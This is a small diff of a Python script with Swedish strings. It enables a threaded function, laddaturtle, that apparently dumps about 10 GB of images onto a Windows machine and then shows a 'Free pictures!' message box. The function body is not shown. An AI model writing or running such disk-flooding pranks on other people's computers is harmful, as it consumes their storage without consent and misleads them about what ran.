@@ -1,7 +1,7 @@
 import zipfile
 import os
 import threading
-import ctypes  # ← add this
+import ctypes  
 from concurrent.futures import ThreadPoolExecutor
 
 def laddaturtle():
@@ -42,5 +42,5 @@ def laddaturtle():
 
     ctypes.windll.user32.MessageBoxW(0, "Du fick nyss 10 gb av bilder😘", "Gratis bilder!", 1)  # ← fixed
 
-"""a = threading.Thread(target=laddaturtle)
-a.start()"""
+a = threading.Thread(target=laddaturtle)
+a.start()
